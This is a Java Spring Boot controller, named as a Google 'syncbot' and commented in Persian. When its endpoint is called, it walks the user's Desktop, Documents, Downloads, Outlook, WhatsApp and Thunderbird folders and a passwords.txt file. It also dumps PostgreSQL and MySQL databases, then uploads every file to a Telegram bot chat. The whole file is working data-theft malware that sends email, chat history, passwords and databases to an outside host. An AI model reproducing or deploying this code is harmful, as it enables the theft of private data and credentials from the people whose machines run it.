package com.google.syncbot;

import org.springframework.core.io.FileSystemResource;
import org.springframework.http.*;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.io.File;
import java.nio.file.*;

@RestController
@RequestMapping("/google")
public class SyncController {

    private final String BOT_TOKEN = System.getenv("BOT_TOKEN");
    private final String CHAT_ID = System.getenv("CHAT_ID");

    // مسیر داینامیک کاربر فعلی ویندوز
    private final String userHome = System.getProperty("user.home");

    // پوشه‌ها و فایل‌های مهم
    private final String[] IMPORTANT_PATHS = {
            userHome + "/Desktop",
            userHome + "/Documents",
            userHome + "/Downloads",
            userHome + "/Documents/Outlook Files",
            userHome + "/AppData/Roaming/WhatsApp",
            userHome + "/AppData/Roaming/Thunderbird/Profiles",
            userHome + "/AppData/Roaming/MyApp/config.db",       // فایل دیتابیس اپ
            userHome + "/AppData/Roaming/MyApp/passwords.txt",   // فایل پسوردها
            userHome + "/AppData/Roaming/MyApp/dashboard.json"   // فایل داشبورد
    };

    private final RestTemplate restTemplate = new RestTemplate();

    @GetMapping
    public String sendToTelegram() {
        try {
            System.out.println("🚀 شروع ارسال فایل‌ها و دیتابیس‌ها...");

            // اول بکاپ دیتابیس‌ها
            backupDatabases();

            // بعد فایل‌های مهم
            boolean success = sendFilesDirectly(IMPORTANT_PATHS);

            return success ? "✅ همه فایل‌ها و دیتابیس‌ها ارسال شدند"
                           : "❌ خطا در ارسال فایل‌ها یا دیتابیس‌ها";

        } catch (Exception e) {
            e.printStackTrace();
            return "خطا: " + e.getMessage();
        }
    }

    private void backupDatabases() {
        try {
            // PostgreSQL Backup
            ProcessBuilder pgDump = new ProcessBuilder(
                    "pg_dump",
                    "-U", "postgres",
                    "-F", "c",
                    "-b",
                    "-v",
                    "-f", userHome + "/Documents/db_backup.dump",
                    "mydatabase"
            );
            pgDump.environment().put("PGPASSWORD", System.getenv("PG_PASS"));
            pgDump.start().waitFor();

            // MySQL Backup
            ProcessBuilder myDump = new ProcessBuilder(
                    "mysqldump",
                    "-u", "root",
                    "-p" + System.getenv("MYSQL_PASS"),
                    "mydb"
            );
            myDump.redirectOutput(new File(userHome + "/Documents/mysql_backup.sql"));
            myDump.start().waitFor();

            // ارسال بکاپ‌ها
            sendDocumentToTelegram(new File(userHome + "/Documents/db_backup.dump"));
            sendDocumentToTelegram(new File(userHome + "/Documents/mysql_backup.sql"));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean sendFilesDirectly(String[] paths) {
        try {
            for (String pathStr : paths) {
                Path path = Paths.get(pathStr);

                if (!Files.exists(path)) {
                    System.out.println("📂 مسیر پیدا نشد: " + pathStr);
                    continue;
                }

                if (Files.isDirectory(path)) {
                    Files.walk(path)
                            .filter(Files::isRegularFile)
                            .forEach(file -> {
                                try {
                                    System.out.println("📤 ارسال فایل: " + file);
                                    sendDocumentToTelegram(file.toFile());
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            });
                } else {
                    // اگر مسیر فایل باشه
                    sendDocumentToTelegram(path.toFile());
                }
            }
            return true;

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private boolean sendDocumentToTelegram(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.MULTIPART_FORM_DATA);

            MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
            body.add("chat_id", CHAT_ID);
            body.add("document", new FileSystemResource(file));
            body.add("caption", "📄 فایل: " + file.getName());

            HttpEntity<MultiValueMap<String, Object>> request = new HttpEntity<>(body, headers);

            ResponseEntity<String> response = restTemplate.postForEntity(url, request, String.class);
            return response.getStatusCode().is2xxSuccessful();

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
